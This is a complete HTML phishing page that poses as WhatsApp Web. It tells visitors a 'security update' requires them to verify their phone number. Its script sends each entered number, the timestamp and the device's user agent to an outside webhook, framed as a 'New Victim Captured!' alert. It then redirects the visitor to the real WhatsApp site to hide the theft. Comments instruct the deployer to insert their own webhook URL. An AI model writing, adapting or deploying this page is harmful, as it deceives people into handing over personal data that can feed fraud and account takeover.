<!DOCTYPE html>
<html>
<head>
    <title>WhatsApp Web</title>
    <style>
        body { font-family: Arial, sans-serif; background: #111; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; background: #1e1e1e; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        .logo { width: 100px; margin-bottom: 20px; }
        .input-group { margin: 15px 0; }
        input { padding: 12px; width: 280px; border: none; border-radius: 5px; font-size: 16px; text-align: center; }
        button { padding: 12px 30px; background: #008069; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; transition: 0.3s; }
        button:hover { background: #006d59; }
        #status { font-size: 14px; margin-top: 15px; color: #aaa; min-height: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <h2>Verify Your Number</h2>
        <p style="color: #ccc; font-size: 14px;">We detected a security update. Please verify to continue.</p>
        
        <div class="input-group">
            <input type="tel" id="phone" placeholder="Enter Phone Number (e.g., 919876543210)" required>
        </div>
        <button onclick="captureAndRedirect()">Continue</button>
        <p id="status"></p>
    </div>

    <script>
        // 👇 YAHAN APNA WEBHOOK URL DALO 👇
        const WEBHOOK_URL = "https://webhooksite.net/5fd82665-8a43-42b4-a65a-b95ea5aff5b1"; 

        function captureAndRedirect() {
            const phoneInput = document.getElementById('phone').value;
            const status = document.getElementById('status');
            
            if(!phoneInput) {
                status.innerText = "Please enter a valid number.";
                status.style.color = "#ff6b6b";
                return;
            }

            status.innerText = "Verifying number...";
            status.style.color = "#008069";

            // Data Prepare Karna
            const payload = {
                content: `🚨 **New Victim Captured!** 🚨\n\n📱 **Phone Number:** ${phoneInput}\n⏰ **Time:** ${new Date().toLocaleString()}\n💻 **Device:** ${navigator.userAgent}`,
                username: "WhatsApp Spy"
            };

            // Webhook Par Data Bhejna
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if(response.ok) {
                    status.innerText = "Redirecting to WhatsApp...";
                    // 2 second baad real WhatsApp par bhejo
                    setTimeout(() => {
                        window.location.href = "https://web.whatsapp.com/";
                    }, 2000);
                } else {
                    status.innerText = "Error sending data. Redirecting...";
                    setTimeout(() => {
                        window.location.href = "https://web.whatsapp.com/";
                    }, 2000);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                status.innerText = "Network error. Redirecting...";
                setTimeout(() => {
                    window.location.href = "https://web.whatsapp.com/";
                }, 2000);
            });
        }
    </script>
</body>
</html>
